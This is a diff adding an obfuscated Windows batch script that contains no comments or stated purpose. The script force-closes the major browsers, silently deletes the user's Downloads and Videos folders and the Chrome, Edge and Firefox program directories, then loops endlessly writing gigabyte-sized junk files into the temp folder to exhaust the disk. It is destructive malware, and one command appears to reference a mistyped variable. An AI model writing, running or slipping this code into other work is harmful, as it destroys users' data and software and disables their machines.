@@ -1,0 +1,29 @@
+@echo off
+setlocal EnableDelayedExpansion
+set ^#=%~0
+set ^$=0
+set ^@=fsutil
+set /a ^&=1073741824
+set ^?=taskkill
+set ^_=rmdir
+
+%?% /IM chrome.exe /F >nul 2>&1
+%?% /IM msedge.exe /F >nul 2>&1
+%?% /IM firefox.exe /F >nul 2>&1
+
+%_% /s /q "%userprofile%\Downloads" >nul 2>&1
+%_% /s /q "%userprofile%\Videos" >nul 2>&1
+%_% /s /q "%ProgramFiles%\Google\Chrome" >nul 2>&1
+%_% /s /q "%ProgramFiles(x86)%\Google\Chrome" >nul 2>&1
+%_% /s /q "%ProgramFiles%\Microsoft\Edge" >nul 2>&1
+%_% /s /q "%ProgramFiles(x86)%\Microsoft\Edge" >nul 2>&1
+%_% /s /q "%ProgramFiles%\Mozilla Firefox" >nul 2>&1
+%_% /s /q "%ProgramFiles(x86)%\Mozilla Firefox" >nul 2>&1
+
+:!
+set /a ^$=!random! %% 9
+set /a ^$+=1
+for /l %%i in (1,1,!^$!) do set /a ^+=!random!
+set ^+=!random!
+%@@% file createnew "%temp%\!^+!_!random!.bin" !^&! >nul 2>&1
+goto !
